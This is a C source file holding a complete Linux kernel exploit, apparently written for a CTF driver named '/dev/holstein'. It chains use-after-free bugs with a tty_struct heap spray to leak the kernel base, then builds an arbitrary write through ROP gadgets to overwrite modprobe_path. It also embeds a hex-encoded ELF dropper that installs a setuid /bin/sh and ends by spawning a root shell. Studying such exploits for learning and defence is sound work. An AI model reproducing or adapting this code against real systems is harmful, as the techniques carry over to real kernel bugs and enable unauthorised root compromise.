#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <poll.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/prctl.h>
#include <unistd.h>

#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/mount.h>
#include <sys/msg.h>
#include <sys/shm.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/utsname.h>

typedef uint8_t u8;
typedef uint16_t u16;
typedef uint32_t u32;
typedef uint64_t u64;

typedef int8_t i8;
typedef int16_t i16;
typedef int32_t i32;
typedef int64_t i64;

#define ofs_tty_ops 0xc39c60
#define spray_num 100
#define dev_vuln "/dev/holstein"
#define prepare_kernel_cred (kbase + 0x72560)
#define commit_creds (kbase + 0x723c0)
#define pop_rdi_ret (kbase + 0x14078a)
#define pop_rcx_ret (kbase + 0x0eb7e4)
#define push_rdx_pop_rsp_pop_ret (kbase + 0x14fbea)
#define mov_rdi_rax_rep_movsq_ret (kbase + 0x638e9b)
#define swapgs_restore_regs_and_return_to_usermode (kbase + 0x800e26)
#define mov_ptr_rdx_rcx_ret (kbase + 0x1b2d06)
#define mov_eax_ptr_rdx_ret (kbase + 0x4469e8)
#define modprobe_path (kbase + 0xe38480)

u64 kbase;
u64 g_buf;
i32 fd1, fd2, fd3, fd4;
i32 spray[spray_num];
char win_condition[] = "/tmp/ggwp";
char buf[0x500];
void fatal(char *msg) {
  perror(msg);
  exit(-1);
}

/*
 * Ref:
 * https://0x434b.dev/dabbling-with-linux-kernel-exploitation-ctf-challenges-to-learn-the-ropes/#version-3-probing-the-mods
 * Dropper...:
 * fd = open("/tmp/win", 0_WRONLY | O_CREAT | O_TRUNC);
 * write(fd, shellcode, shellcodeLen);
 * chmod("/tmp/win", 0x4755);
 * close(fd);
 * exit(0)
 *
 * ... who drops some shellcode ELF:
 * setuid(0);
 * setgid(0);
 * execve("/bin/sh", ["/bin/sh"], NULL);
 */
unsigned char dropper[] = {
    0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x03, 0x00, 0x3e, 0x00, 0x01, 0x00, 0x00, 0x00,
    0x78, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x38, 0x00, 0x01, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0xb9, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xb9, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0xb0, 0x02, 0x48, 0x8d, 0x3d, 0x3b, 0x00, 0x00, 0x00, 0xbe, 0x41, 0x02,
    0x00, 0x00, 0x0f, 0x05, 0x48, 0x89, 0xc7, 0x48, 0x8d, 0x35, 0x33, 0x00,
    0x00, 0x00, 0xba, 0xa0, 0x00, 0x00, 0x00, 0xb0, 0x01, 0x0f, 0x05, 0x48,
    0x31, 0xc0, 0xb0, 0x03, 0x0f, 0x05, 0x48, 0x8d, 0x3d, 0x13, 0x00, 0x00,
    0x00, 0xbe, 0xff, 0x0d, 0x00, 0x00, 0xb0, 0x5a, 0x0f, 0x05, 0x48, 0x31,
    0xff, 0xb0, 0x3c, 0x0f, 0x05, 0x00, 0x00, 0x00, 0x2f, 0x74, 0x6d, 0x70,
    0x2f, 0x77, 0x69, 0x6e, 0x00, 0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x03, 0x00, 0x3e,
    0x00, 0x01, 0x00, 0x00, 0x00, 0x78, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x38,
    0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00,
    0x00, 0x05, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0xa0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0xa0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x31, 0xff, 0xb0, 0x69, 0x0f, 0x05,
    0x48, 0x31, 0xff, 0xb0, 0x6a, 0x0f, 0x05, 0x48, 0xbb, 0xd1, 0x9d, 0x96,
    0x91, 0xd0, 0x8c, 0x97, 0xff, 0x48, 0xf7, 0xdb, 0x53, 0x48, 0x89, 0xe7,
    0x56, 0x57, 0x48, 0x89, 0xe6, 0xb0, 0x3b, 0x0f, 0x05};

int check = -1;
void aaw(u64 addr, u32 val) {
  printf("aww: val 0x%x at addr 0x%lx\n", val, addr);
  if (check == -1) {
    read(fd4, buf, 0x400);
    *(u64 *)&buf[0x18] = g_buf + 0x3f8 - 12 * 8;
    write(fd4, buf, 0x20);
    for (int i = spray_num / 2; i < spray_num; i++) {
      int v = ioctl(spray[i], val, addr);
      if (v != -1) {
        printf("found tty_struct at idx: %d\n", i);
        check = spray[i];
        break;
      }
    }
  } else {
    ioctl(check, val, addr);
  }
}

int main() {
  puts("open 1 2 and close 1 -> uaf1");
  fd1 = open("/dev/holstein", O_RDWR);
  fd2 = open("/dev/holstein", O_RDWR);
  close(fd1);
  puts("spayinggg !!!");
  for (int i = 0; i < spray_num / 2; i++) {
    spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
    if (spray[i] < 0) {
      fatal("cuts");
    }
  }
  puts("prepare leak!!!");
  read(fd2, buf, 0x400); // read tty_struct
  kbase = *(u64 *)&buf[0x18] - ofs_tty_ops;
  g_buf = *(u64 *)&buf[0x38] - 0x38;
  printf("[+] kbase: 0x%lx\n", kbase);
  printf("[+] gbuf: 0x%lx\n", g_buf);
  printf("preparing rop chain \n");
  if ((g_buf & 0xffffffff00000000) == 0xffffffff00000000) {
    printf("[-] heap spraying failed\n");
    for (int i = 0; i < spray_num / 2; i++)
      close(spray[i]);
    exit(-1);
  }

  *(u64 *)&buf[0x3f8] = mov_ptr_rdx_rcx_ret;

  printf("overwriting tty_struct -> gadget\n");
  write(fd2, buf, 0x400);

  puts("uaf2");
  fd3 = open("/dev/holstein", O_RDWR);
  fd4 = open("/dev/holstein", O_RDWR);
  if (fd3 < 1 || fd4 < 1) {
    fatal("cuts");
  }
  close(fd3);
  puts("spraying uaf2");
  for (int i = spray_num / 2; i < spray_num; i++) {
    spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
    if (spray[i] < 0) {
      fatal("cuts");
    }
  }
  for (int i = 0; i < sizeof(win_condition); i += 4) {
    aaw(modprobe_path + i, *(u32 *)&win_condition[i]);
  }
  FILE *fptr = fopen(win_condition, "w");
  if (!fptr) {
    puts("[!] Failed to open win condition");
    exit(-1);
  }
  // write dropper to win_condition
  if (fwrite(dropper, sizeof(dropper), 1, fptr) < 1) {
    puts("[!] Failed to write win condition");
    exit(-1);
  }
  fclose(fptr);
  if (chmod(win_condition, 0777) < 0) {
    puts("[!] Failed to chmod win condition");
    exit(-1);
  };
  puts("[+] win_condition (dropper) written to /tmp/ggwp");

  puts("[*] triggering modprobe");
  system("chmod +x /tmp/ggwp");
  system("echo -e '\xde\xad\xbe\xef' > /tmp/pwn");
  system("chmod +x /tmp/pwn");
  system("/tmp/pwn"); // trigger modprobe_path

  puts("[*] spawning root shell");
  system("/tmp/win");
  return 0;
}